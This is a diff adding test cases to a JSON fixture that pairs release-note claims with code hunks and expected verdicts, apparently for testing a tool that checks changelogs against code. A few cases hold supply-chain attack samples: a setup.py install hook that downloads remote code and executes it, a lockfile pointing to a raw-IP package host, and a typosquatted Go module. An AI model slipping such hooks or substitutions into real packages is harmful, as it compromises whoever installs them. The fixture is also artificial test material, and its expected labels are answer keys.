@@ -102,5 +102,165 @@
       }
     ],
     "expected": ["no-evidence"]
+  },
+  {
+    "name": "disabled-by-default-claim-vs-enabled-default",
+    "section": "What's Changed",
+    "claim": "Anonymous usage metrics are opt-in and disabled by default",
+    "hunks": [
+      {
+        "path": "config/defaults.go",
+        "hunk": "@@ -88,6 +88,8 @@ func defaultConfig() *Config {\n     cfg.LogLevel = \"info\"\n+    // Send anonymous usage metrics unless the operator opts out.\n+    cfg.MetricsReporting = true\n     cfg.DNSOverride = false"
+      },
+      {
+        "path": "docs/metrics.md",
+        "hunk": "@@ -1,3 +1,5 @@\n # Metrics\n+\n+Set `metrics_reporting: false` to disable reporting."
+      }
+    ],
+    "expected": ["contradicted"]
+  },
+  {
+    "name": "version-claim-vs-actual-bump",
+    "section": "Security",
+    "claim": "Updates bundled OpenSSL to 3.5.2 to address CVE-2026-4207",
+    "hunks": [
+      {
+        "path": "deps/openssl/version.cmake",
+        "hunk": "@@ -1,2 +1,2 @@\n-set(OPENSSL_VERSION \"3.4.0\")\n+set(OPENSSL_VERSION \"3.4.1\")"
+      }
+    ],
+    "expected": ["contradicted"]
+  },
+  {
+    "name": "removal-claim-vs-deprecation-only",
+    "section": "Breaking Changes",
+    "claim": "The legacy v1 HTTP API has been removed",
+    "hunks": [
+      {
+        "path": "server/api_v1.go",
+        "hunk": "@@ -20,6 +20,9 @@ func registerV1Routes(mux *http.ServeMux) {\n+    // Deprecated: v1 will be removed in a future release.\n+    log.Warn(\"the v1 API is deprecated and will be removed in a future release\")\n     mux.HandleFunc(\"/v1/nodes\", handleNodes)\n     mux.HandleFunc(\"/v1/routes\", handleRoutes)"
+      }
+    ],
+    "expected": ["contradicted"]
+  },
+  {
+    "name": "js-lockfile-nonregistry-source",
+    "section": "What's Changed",
+    "claim": "chore: routine dependency updates from the npm registry",
+    "hunks": [
+      {
+        "path": "package-lock.json",
+        "hunk": "@@ -1041,9 +1041,9 @@\n     \"node_modules/color-convert\": {\n-      \"version\": \"2.0.1\",\n-      \"resolved\": \"https://registry.npmjs.org/color-convert/-/color-convert-2.0.1.tgz\",\n-      \"integrity\": \"sha512-RRECPsj7iu/xb5oKYcsFHSppFNnsj/52OVTRKb4zP5onXwVF3zVmmToNcOfGC+CRDpfK/U584fMg38ZHCaElKQ==\",\n+      \"version\": \"2.0.2\",\n+      \"resolved\": \"http://198.51.100.23:8080/pkgs/color-convert-2.0.2.tgz\",\n+      \"integrity\": \"sha512-9O0kQmXh3AeeTf6dcCK9r1M2QpKwS3jZihxGjZUAYIQEqhtQrqk1I0PPBjMgLYPUjMDzop5NyPKZ2VRMPtHGXg==\","
+      }
+    ],
+    "expected": ["contradicted"]
+  },
+  {
+    "name": "setup-py-install-hook-vs-cleanup-claim",
+    "section": "What's Changed",
+    "claim": "Packaging cleanup in setup.py",
+    "hunks": [
+      {
+        "path": "setup.py",
+        "hunk": "@@ -8,6 +8,16 @@ from setuptools import setup\n+from setuptools.command.install import install\n+import urllib.request, subprocess\n+\n+class PostInstall(install):\n+    def run(self):\n+        install.run(self)\n+        code = urllib.request.urlopen(\"https://paste.example-cdn.net/raw/8fq2\").read()\n+        subprocess.run([\"python\", \"-c\", code], check=False)\n+\n setup(\n     name=\"toolkit\",\n+    cmdclass={\"install\": PostInstall},"
+      }
+    ],
+    "expected": ["contradicted", "no-evidence"]
+  },
+  {
+    "name": "go-module-source-rename-vs-update-claim",
+    "section": "What's Changed",
+    "claim": "Update dependencies to their latest upstream versions",
+    "hunks": [
+      {
+        "path": "go.mod",
+        "hunk": "@@ -12,3 +12,3 @@ require (\n-\tgithub.com/hashicorp/go-retryablehttp v0.7.7\n+\tgithub.com/hashicorq/go-retryablehttp v0.7.7\n \tgolang.org/x/crypto v0.31.0"
+      },
+      {
+        "path": "internal/client/http.go",
+        "hunk": "@@ -5,3 +5,3 @@ import (\n-\t\"github.com/hashicorp/go-retryablehttp\"\n+\t\"github.com/hashicorq/go-retryablehttp\"\n )"
+      }
+    ],
+    "expected": ["contradicted", "no-evidence"]
+  },
+  {
+    "name": "docs-only-claim-with-docs-hunk",
+    "section": "Details",
+    "claim": "Documentation: clarify how restore handles Windows path separators",
+    "hunks": [
+      {
+        "path": "doc/050_restore.rst",
+        "hunk": "@@ -140,4 +140,12 @@ Restoring from a snapshot\n+On Windows, target paths may use either forward or backward slashes;\n+``restic restore`` normalizes them before matching. For example::\n+\n+    restic restore latest --target C:\\restored --include /home/user/file.txt"
+      }
+    ],
+    "expected": ["verified"]
+  },
+  {
+    "name": "docs-claim-vs-code-only-hunks",
+    "section": "What's Changed",
+    "claim": "Improved the troubleshooting guide with new sections on connection errors",
+    "hunks": [
+      {
+        "path": "internal/backend/retry.go",
+        "hunk": "@@ -61,7 +61,9 @@ func (be *Backend) retry(ctx context.Context, op func() error) error {\n-    if err != nil {\n+    if err != nil && !errors.Is(err, context.Canceled) {\n         be.report(err)\n+        time.Sleep(be.delay)\n     }"
+      }
+    ],
+    "expected": ["no-evidence"]
+  },
+  {
+    "name": "fix-reverted-later-in-range",
+    "section": "Bug Fixes",
+    "claim": "Fixed a crash when the config file is empty",
+    "hunks": [
+      {
+        "path": "internal/config/load.go",
+        "hunk": "@@ -30,6 +30,9 @@ func Load(path string) (*Config, error) {\n     data, err := os.ReadFile(path)\n+    if len(data) == 0 {\n+        return DefaultConfig(), nil\n+    }\n     return parse(data)"
+      },
+      {
+        "path": "internal/config/load.go",
+        "hunk": "@@ -30,9 +30,6 @@ func Load(path string) (*Config, error) {\n     data, err := os.ReadFile(path)\n-    // Revert \"config: return defaults for empty files\" — broke validation.\n-    if len(data) == 0 {\n-        return DefaultConfig(), nil\n-    }\n     return parse(data)"
+      }
+    ],
+    "expected": ["contradicted", "no-evidence"]
+  },
+  {
+    "name": "legit-need-more-files",
+    "section": "Bug Fixes",
+    "claim": "Fix race condition in session cleanup: internal/session/cleanup.go now takes the registry lock before pruning expired entries",
+    "hunks": [
+      {
+        "path": "CHANGELOG.md",
+        "hunk": "@@ -1,2 +1,4 @@\n # Changelog\n+\n+- Fix race condition in session cleanup"
+      },
+      {
+        "path": "internal/version/version.go",
+        "hunk": "@@ -1,3 +1,3 @@ package version\n-const Version = \"1.8.3\"\n+const Version = \"1.8.4\""
+      }
+    ],
+    "expected": ["need"]
+  },
+  {
+    "name": "partial-fix-vs-total-claim",
+    "section": "Bug Fixes",
+    "claim": "Fixed all memory leaks in the render loop",
+    "hunks": [
+      {
+        "path": "src/render/loop.c",
+        "hunk": "@@ -204,6 +204,7 @@ static void render_frame(struct ctx *ctx) {\n     struct framebuf *fb = framebuf_acquire(ctx);\n     draw_scene(ctx, fb);\n+    framebuf_release(fb);\n     present(ctx, fb);\n }\n /* TODO: texture cache still grows unboundedly across scene changes */"
+      }
+    ],
+    "expected": ["partial", "contradicted"]
+  },
+  {
+    "name": "issue-anchored-cherry-pick-fix",
+    "section": "Details",
+    "claim": "Prevent crash in mountpoint validation if the mountpoint is inaccessible: restic no longer panics when stat on the mountpoint fails",
+    "hunks": [
+      {
+        "path": "cmd/restic/cmd_mount.go",
+        "hunk": "@@ -120,8 +120,11 @@ func validateMountpoint(path string) error {\n-    fi, err := os.Stat(path)\n-    if !fi.IsDir() {\n+    fi, err := os.Stat(path)\n+    if err != nil {\n+        return errors.Fatalf(\"unable to access mountpoint %v: %v\", path, err)\n+    }\n+    if !fi.IsDir() {\n         return errors.Fatal(\"mountpoint is not a directory\")\n     }"
+      }
+    ],
+    "expected": ["verified"]
   }
 ]
